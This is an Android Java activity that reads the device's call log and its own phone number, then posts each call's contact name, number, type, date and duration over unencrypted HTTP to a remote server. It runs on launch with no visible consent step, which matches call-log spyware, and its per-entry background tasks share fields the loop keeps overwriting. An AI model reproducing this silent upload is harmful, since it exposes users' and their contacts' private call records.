package com.example.phonecalllog;

import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import com.example.phonecalllog.details.CallLogModel;

import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.PhoneNumberUtils;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;

public class DetailsInfoActivity extends Activity {
	
	public static final String MESSAGE_TYPE_INBOX = "1";
    public static final String MESSAGE_TYPE_SENT = "2";
    public static final String MESSAGE_TYPE_CONVERSATIONS = "3";
    public static final String MESSAGE_TYPE_NEW = "new";

    final static private String[] CALL_PROJECTION = { CallLog.Calls.TYPE,
                                                      CallLog.Calls.CACHED_NAME, CallLog.Calls.NUMBER,
                                                      CallLog.Calls.DATE,        CallLog.Calls.DURATION };
   
    private static final String TAG = "Victor-Manage_Clique";

    private Cursor getCallHistoryCursor(Context context) {
        Cursor cursor = context.getContentResolver().query(
                                                CallLog.Calls.CONTENT_URI, CALL_PROJECTION,
                                                null, null, CallLog.Calls.DEFAULT_SORT_ORDER);       
        return cursor;
    }
    
    String PhoneNumber, phNumber , callDuration, dir, callDate, na;
    Date callDayTime;
    
	TextView textView; 
	@Override 
	
	protected void onCreate(Bundle savedInstanceState) { 
		super.onCreate(savedInstanceState); 
		setContentView(R.layout.details); 
		
//		TelephonyManager manager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
//		String phoneNumber = manager.getLine1Number();
//		
//		TelephonyManager systemService = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
//		String PhoneNumber = systemService.getLine1Number();
//		PhoneNumber = PhoneNumber.substring(PhoneNumber.length()-10,PhoneNumber.length());
//		PhoneNumber="0"+PhoneNumber;
		
		getCallDetails();
		
		} 
		
		public void getCallDetails() { 
			StringBuffer sb = new StringBuffer();

			Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
			
			int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
			int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER); 
			int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE); 
			int date = managedCursor.getColumnIndex(CallLog.Calls.DATE); 
			int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION); 
			sb.append("Call Log :"); 
			while (managedCursor.moveToNext()) { 
				
				TelephonyManager systemService = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
				PhoneNumber = systemService.getLine1Number();
				PhoneNumber = PhoneNumber.substring(PhoneNumber.length()-11,PhoneNumber.length());
				PhoneNumber=""+PhoneNumber;
				PhoneNumber = PhoneNumberUtils.formatNumber(PhoneNumber);
				
				phNumber = managedCursor.getString(number);
				na = managedCursor.getString(name);
				if(na == null)
					na = "No name";
				
				String callType = managedCursor.getString(type); 
				String callDate = managedCursor.getString(date);
				callDayTime=new Date(Long.valueOf(callDate));
				callDuration = managedCursor.getString(duration); 
				dir = null; int dircode = Integer.parseInt(callType); 
				switch (dircode) { 
				case CallLog.Calls.OUTGOING_TYPE: dir = "OUTGOING";
				break; 
				case CallLog.Calls.INCOMING_TYPE: dir = "INCOMING"; 
				break; 
				case CallLog.Calls.MISSED_TYPE: dir = "MISSED"; 
				break;
				}
				sb.append("\nfr_Number:--- " + na +"\nMyNumber:--- " + PhoneNumber +"\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall Duration in sec :--- " + callDuration); 
				sb.append("\n----------------------------------"); 
				new PostDataAsyncTask().execute();
				}		
			managedCursor.close();
			
			}
		
		
		
		public class PostDataAsyncTask extends AsyncTask<String, String, String> {
	    	 
	        protected void onPreExecute() {
	            super.onPreExecute();
	            // do stuff before posting data
	        }
	 
	        @Override
	        protected String doInBackground(String... strings) {
	            try {
	 
	                // 1 = post text data, 2 = post file
	                int actionChoice = 2;
	                 
	                // post a text data
	                if(actionChoice==1){
	                    postText();
	                }
	                 
	                // post a file
	                else{
	                	postText();
	                }
	                 
	            } catch (NullPointerException e) {
	                e.printStackTrace();
	            } catch (Exception e) {
	                e.printStackTrace();
	            }
	            return null;
	        }
	 
	        @Override
	        protected void onPostExecute(String lenghtOfFile) {
	            // do stuff after posting data
	        }
	    }
	     
	    // this will post our text data
	    private void postText(){
	        try{
	            // url where the data will be posted
	            String postReceiverUrl = "http://myphonelog.com/phonecalllog/index.php/server_api/save_log";
	            Log.v(TAG, "postURL: " + postReceiverUrl);
	             
	            // HttpClient
	            HttpClient httpClient = new DefaultHttpClient();
	             
	            // post header
	            HttpPost httpPost = new HttpPost(postReceiverUrl);
	     
	            // add your data
	            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
	            
	            nameValuePairs.add(new BasicNameValuePair("my_number", PhoneNumber));
	            nameValuePairs.add(new BasicNameValuePair("fr_name", na));
	            nameValuePairs.add(new BasicNameValuePair("fr_number", phNumber));
	            nameValuePairs.add(new BasicNameValuePair("type", dir));
	            nameValuePairs.add(new BasicNameValuePair("date", callDayTime.toString()));
	            nameValuePairs.add(new BasicNameValuePair("duration", callDuration));
	             
	            httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
	     
	            // execute HTTP post request
	            HttpResponse response = httpClient.execute(httpPost);
	            HttpEntity resEntity = response.getEntity();
	             
	            if (resEntity != null) {
	                 
	                String responseStr = EntityUtils.toString(resEntity).trim();
	                Log.v(TAG, "Response: " +  responseStr);
	                 
	                // you can add an if statement here and do other actions based on the response
	            }
	             
	        } catch (ClientProtocolException e) {
	            e.printStackTrace();
	        } catch (IOException e) {
	            e.printStackTrace();
	        }
	    }

	    private String timeToString(Long time) {
	        SimpleDateFormat simpleFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
	        String date = simpleFormat.format(new Date(time));
	        return date;
	    }
}
